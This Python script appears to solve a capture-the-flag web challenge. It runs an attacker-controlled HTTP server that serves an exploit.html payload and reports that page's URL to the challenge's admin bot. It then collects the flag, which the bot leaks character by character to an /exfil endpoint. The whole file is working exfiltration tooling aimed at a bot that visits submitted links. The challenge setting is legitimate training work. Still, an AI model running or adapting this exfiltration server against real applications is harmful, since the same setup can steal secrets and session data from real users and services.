import threading
import time
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import sys
import os
CHALL_URL = 'http://127.0.0.1:4567'
HOST = '0.0.0.0'
PORT = 8000
MY_IP = 'host.docker.internal' 
class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/exfil'):
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            if 'flag' in query:
                print(f"[+] Leaked: {query['flag'][0]}", flush=True)
                if query['flag'][0].endswith('}'):
                    print("\n[!] Flag extracted completely! Exiting...")
                    threading.Timer(0.5, lambda: os._exit(0)).start()
            self.send_response(200)
            self.end_headers()
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            with open('exploit.html', 'r') as f:
                content = f.read()
                content = content.replace('http://YOUR_SERVER_IP:PORT', f'http://{MY_IP}:{PORT}')
                self.wfile.write(content.encode())
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, format, *args):
        pass
def start_server():
    server = HTTPServer((HOST, PORT), ExploitHandler)
    print(f"[*] Exploit server listening on http://{HOST}:{PORT}")
    server.serve_forever()
if __name__ == '__main__':
    t = threading.Thread(target=start_server)
    t.daemon = True
    t.start()
    time.sleep(1)
    exploit_url = f'http://{MY_IP}:{PORT}/'
    print(f"[*] Submitting {exploit_url} to the bot...")
    try:
        r = requests.post(f"{CHALL_URL}/report", data={'url': exploit_url})
        if r.status_code == 200:
            print("[*] Successfully reported. Waiting for bot to execute payload...")
        else:
            print(f"[-] Failed to report. Status: {r.status_code}")
    except Exception as e:
        print(f"[-] Could not connect to challenge: {e}")
    while True:
        time.sleep(1)
